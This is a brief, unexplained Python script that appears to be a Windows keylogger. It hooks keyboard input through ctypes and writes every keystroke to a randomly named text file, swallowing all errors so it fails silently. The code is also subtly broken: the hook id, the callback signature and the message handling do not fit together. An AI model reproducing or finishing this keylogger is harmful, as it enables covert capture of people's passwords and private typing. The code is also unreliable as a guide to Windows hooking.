```python
import ctypes
import os
from random import choice
from string import ascii_letters

FILE_NAME = ''.join(choice(ascii_letters) for i in range(10)) + '.txt'

def on_press(key):
    try:
        with open(FILE_NAME, 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(str(key))
    except Exception:
        pass

hook = ctypes.windll.user32.SetWindowsHookExA(
    0x13, ctypes.WINFUNCTYPE(None, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))(on_press), 0,
    os.getpid())
if hook != 0:
    msg = ctypes.windll.user32.GetMessageA(None, 0, 0, 0)
```